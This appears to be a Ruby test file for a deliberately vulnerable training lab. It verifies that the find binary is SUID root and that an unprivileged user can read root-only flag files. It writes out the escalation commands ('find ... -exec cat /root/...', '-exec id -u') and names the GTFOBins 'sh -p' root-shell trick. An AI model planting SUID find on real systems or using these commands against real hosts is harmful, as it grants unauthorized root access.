require_relative '../../../../../lib/post_provision_test'

class SuidRootFindTest < PostProvisionTest
  def initialize
    self.module_name = 'suid_root_find'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # read_facts: leaked_filenames and strings_to_leak. Both are checked below
  # through json_inputs (file name in /root, and its content via the exploit).
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      # the real binary (symlinks resolved), root-owned with the SUID bit
      test_local_command('find resolves to a root-owned SUID file',
                         "stat -L -c '%a %U' $(command -v find)", '4755 root')
      leaked.each do |f|
        test_local_command("#{f} root-only in /root",
                           "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      user = 'nobody'
      # what a student sees when enumerating SUID binaries
      test_local_command('find is listed among SUID binaries for an unprivileged user',
                         'find / -perm -4000 -type f 2>/dev/null', '/usr/bin/find', user: user)
      # control: the flag is really unreadable without the escalation
      leaked.each do |f|
        test_local_command("control: unprivileged user cannot read #{f}",
                           "cat #{Shellwords.escape("/root/#{f}")} 2>&1", 'Permission denied', user: user)
      end
      # the misconfiguration: find -exec keeps the effective uid of root with sh -p
      test_local_command('unprivileged user runs a command as root via find',
                         "find /etc/hostname -exec id -u \; -quit", '0', user: user)
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_local_command("unprivileged user reads leaked #{fname} via find",
                           "find /etc/hostname -exec cat #{Shellwords.escape("/root/#{fname}")} \; -quit",
                           s.strip.lines.first.to_s.strip, user: user)
      end
    end

    # TODO tier 3 (exploit): hand-written — with_throwaway_ssh_user, GTFOBins find SUID (-exec sh -p) reads the root-only flag
  end

end

SuidRootFindTest.new.run
